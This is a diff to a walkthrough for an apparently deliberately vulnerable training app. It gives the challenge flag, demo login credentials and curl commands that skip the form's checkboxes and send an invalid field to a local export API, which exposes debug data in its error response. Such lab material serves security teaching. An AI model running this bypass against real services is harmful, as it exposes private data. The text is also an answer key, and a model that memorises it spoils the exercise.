@@ -26,32 +26,24 @@ In this application, the user data export endpoint (`/api/user/export`) allows u
 To retrieve the flag `OSS{1nf0_d1scl0sur3_4p1_3rr0r}`, follow these steps:
 
 1. Log in to the application (e.g., as alice@example.com / iloveduck)
-2. Navigate to the Profile page (`/profile`)
-3. Click on the "Data Export" tab
-4. In the "Fields to Export" input, enter any invalid field name like `invalid_field`
-5. Click "Export Data"
-6. Observe the error response which includes debug information
-7. In the `systemDiagnostics.featureFlags` array, find the flag
+2. Navigate to the Profile page (`/profile`) and click on the "Data Export" tab
+3. Notice the form uses checkboxes with only valid fields -- you can't submit invalid input through the UI
+4. Bypass the frontend and call the API directly with an invalid field name
+5. Observe the error response which includes debug information
+6. In the `systemDiagnostics.featureFlags` field, find the flag
 
-**Using browser console:**
+**Using curl:**
 
-```javascript
-fetch("/api/user/export", {
-  method: "POST",
-  credentials: "include",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    format: "json",
-    fields: "invalid_field",
-  }),
-})
-  .then((r) => r.json())
-  .then((data) => {
-    console.log(
-      "All flags exposed:",
-      data.debug.systemDiagnostics.featureFlags
-    );
-  });
+```bash
+# First, log in and save cookies
+curl -c cookies.txt -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"alice@example.com","password":"iloveduck"}'
+
+# Then hit the export endpoint with an invalid field
+curl -b cookies.txt -X POST http://localhost:3000/api/user/export \
+  -H "Content-Type: application/json" \
+  -d '{"format":"json","fields":["invalid_field"]}'
 ```
 
 ### Secure Implementation
